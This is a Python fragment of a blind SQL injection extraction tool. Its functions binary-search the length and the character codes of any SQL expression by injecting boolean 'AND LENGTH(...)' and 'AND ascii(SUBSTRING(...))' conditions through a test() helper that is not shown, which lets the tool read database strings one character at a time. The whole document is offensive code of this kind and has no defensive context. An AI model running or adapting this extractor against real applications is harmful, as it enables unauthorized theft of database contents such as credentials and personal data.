def search_length(sql, a, b):
	if(a == b):
		return a
	if(b - a == 1):
		if(test("AND LENGTH({}) = {}".format(sql, b))):
			return b
		else :
			return a
	pivot = int((a+b)/2)
	print("[*] pivot : {} / {}-{}".format(pivot,a, b))
	if test("AND LENGTH({}) < {}".format(sql, pivot)):
		return search_length(sql, a, pivot)
	else:
	 	return search_length(sql, pivot, b)

def str_length(sql):
	i = 1
	while not test("AND LENGTH({}) < {}".format(sql, i)):
		i *= 2
	print("[*] LENGTH({}) > i".format(sql, i))
	return search_length(sql, int(i/2), i)

def search_char(sql, i, a, b):
	if(a == b):
		return a
	if(b - a == 1):
		if(test("AND ascii(SUBSTRING({}, {},1)) = {}".format(sql, i, b))):
			return b
		else :
			return a
	pivot = int((a+b)/2)
	print("[*] pivot : {} / {}-{}".format(pivot,a, b))
	if test("AND ascii(SUBSTRING({}, {},1)) < {}".format(sql, i, pivot)):
		return search_char(sql, i, a, pivot)
	else:
	 	return search_char(sql, i,pivot, b)
	

def read_string(sql):
	str = ''
	if(test("AND LENGTH({})>0".format(sql))):
		l = str_length(sql)
		for i in range(1, l+1):
			str += chr(search_char(sql, i, 20, 127))
			print("[+] find char, str == {}".format(str))
		return str
	else:
		print("[-] string {} do not exist or is null".format(sql))

